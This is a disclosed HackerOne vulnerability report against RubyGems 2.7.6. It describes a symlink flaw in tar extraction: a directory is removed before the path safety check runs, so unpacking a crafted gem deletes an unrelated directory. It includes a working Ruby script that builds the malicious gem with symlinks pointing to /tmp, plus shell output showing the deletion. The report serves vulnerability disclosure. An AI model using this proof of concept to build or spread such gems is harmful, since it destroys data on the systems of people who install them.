# Delete directory using symlink when decompressing tar

## Report Details
- **Report ID**: 317321
- **URL**: https://hackerone.com/reports/317321
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-02-18T10:55:08.651Z
- **Disclosed**: 2019-04-11T11:53:38.276Z

## Reporter
- **Username**: ooooooo_q
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rubygems

## Vulnerability Information
In 2.7.6, the safety of symlink is confirmed with `mkdir_p_safe`,
Before that `FileUtils.rm_rf destination` is running.
Therefore, if `tmp/dir` is specified after `tmp -> /tmp`, the following `/tmp/dir` is deleted.

### Proof of concept

#### builder.rb

```ruby
require 'rubygems/package'

class GemBuiler

   def initialize spec, path
    @_build_time      = Time.now
    @_checksums       = {}
    @_signer          = Gem::Security::Signer.new nil, nil, ""
    @_spec            = spec
    @_path            = path
  end

  def build &block
    Gem.load_yaml
    require 'rubygems/security'

    @_spec.mark_version

    File.open @_path, 'wb' do |gem_io|
      Gem::Package::TarWriter.new gem_io do |gem|
        add_metadata gem
        add_contents gem, &block
        add_checksums gem
      end
    end
  end

  def add_checksums tar
    Gem.load_yaml

    checksums_by_algorithm = Hash.new { |h, algorithm| h[algorithm] = {} }

    @_checksums.each do |name, digests|
      digests.each do |algorithm, digest|
        checksums_by_algorithm[algorithm][name] = digest.hexdigest
      end
    end

    tar.add_file_signed 'checksums.yaml.gz', 0444, @_signer do |io|
      gzip_to io do |gz_io|
        YAML.dump checksums_by_algorithm, gz_io
      end
    end
  end

  def add_contents tar, &block
    digests = tar.add_file_signed 'data.tar.gz', 0444, @_signer do |io|
      gzip_to io do |gz_io|
        Gem::Package::TarWriter.new gz_io, &block
      end
    end

    @_checksums['data.tar.gz'] = digests
  end

  def add_metadata tar 
    digests = tar.add_file_signed 'metadata.gz', 0444, @_signer do |io|
      gzip_to io do |gz_io|
        gz_io.write @_spec.to_yaml
      end
    end

    @_checksums['metadata.gz'] = digests
  end

  def gzip_to io
    gz_io = Zlib::GzipWriter.new io, Zlib::BEST_COMPRESSION
    gz_io.mtime = @_build_time

    yield gz_io
  ensure
    gz_io.close
  end
end

spec = Gem::Specification.new do |s|
  s.name    = 'hello'
  s.version = '0.0.1'
  s.summary = 'hello summary'
  s.author= "test"
end


# create evil gem

rm = GemBuiler.new(spec, "rm_dir.gem")
rm.build do |data_tar|
  data_tar.add_symlink "tmp", "/tmp", 16877
  data_tar.add_symlink "tmp/dir", ".", 16877
end
```

#### execute

```
$ ls /tmp/dir
file

$ ruby builder.rb

$ gem unpack rm_dir.gem
ERROR:  While executing gem ... (Gem::Package::PathError)
    installing into parent path tmp/dir of /xxx/yyy/zzz/... is not allowed

$ ls /tmp/dir
ls: /tmp/dir: No such file or directory
````

## Impact

Unrelated directories will be deleted when unpacking or installing a specially crafted gem.
Since `mkdir_p_safe` produces an error, only one can be specified, but it will be deleted recursively.

## Attachments
No attachments
